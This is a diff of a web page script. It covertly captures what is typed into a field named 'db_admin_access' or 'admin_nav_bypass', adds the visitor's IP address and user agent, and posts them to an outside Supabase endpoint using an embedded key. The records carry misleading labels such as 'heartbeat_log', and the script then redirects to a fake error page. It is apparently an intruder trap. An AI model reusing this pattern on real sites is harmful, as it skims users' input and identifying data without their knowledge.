@@ -1,32 +1,35 @@
 document.addEventListener('DOMContentLoaded', () => {
-    
     const sessionField = document.getElementById('db_admin_access') || document.getElementById('admin_nav_bypass');
-    
-    if (sessionField) {
-        sessionField.addEventListener('input', async () => {
-            if (sessionField.value !== "") {
-                
-                try {
-                    await fetch("https://kvuazjevbeibsgfrxxjp.supabase.co/rest/v1/quote_validation", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json",
-                            "apikey": "sb_publishable_YW4CiOxNDrcIAFlplxDssw_juKo63R8",
-                            "Authorization": "Bearer sb_publishable_YW4CiOxNDrcIAFlplxDssw_juKo63R8",
-                        },
-                        body: JSON.stringify({ 
-                            event: "VALIDATION_ERR", 
-                            path: window.location.pathname,
-                            data: sessionField.value, 
-                        })
-                    });
-                    window.location.href = "https://www.google.com";
-                } catch (e) {   
-                  console.error("Error sending validation data:", e);
-                  
-                }
 
-                
+    if (sessionField) {
+        sessionField.addEventListener('change', async () => {
+            
+            const _id_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt2dWF6amV2YmVpYnNnZnJ4eGpwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYwODk1NjgsImV4cCI6MjA5MTY2NTU2OH0.vNWVQShoEF5Sy99-BJfKONh3WY-tXz5bbi32iz8s6bo";
+            const endpoint = "https://kvuazjevbeibsgfrxxjp.supabase.co/rest/v1/quote_validation";
+
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipRes.json();
+                const response = await fetch(endpoint, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "apikey": _id_token,
+                        "Authorization": "Bearer " + _id_token
+                    },
+                    body: JSON.stringify({
+                        u_id: ipData.ip,
+                        browser_rev: navigator.userAgent,
+                        event: "heartbeat_log", 
+                        data: sessionField.value
+                    })
+                });
+
+                if (response.ok) {
+                    
+                    window.location.href = "/error-timeout.html?code=0x4042";
+                }
+            } catch (err) {
                 
             }
         });
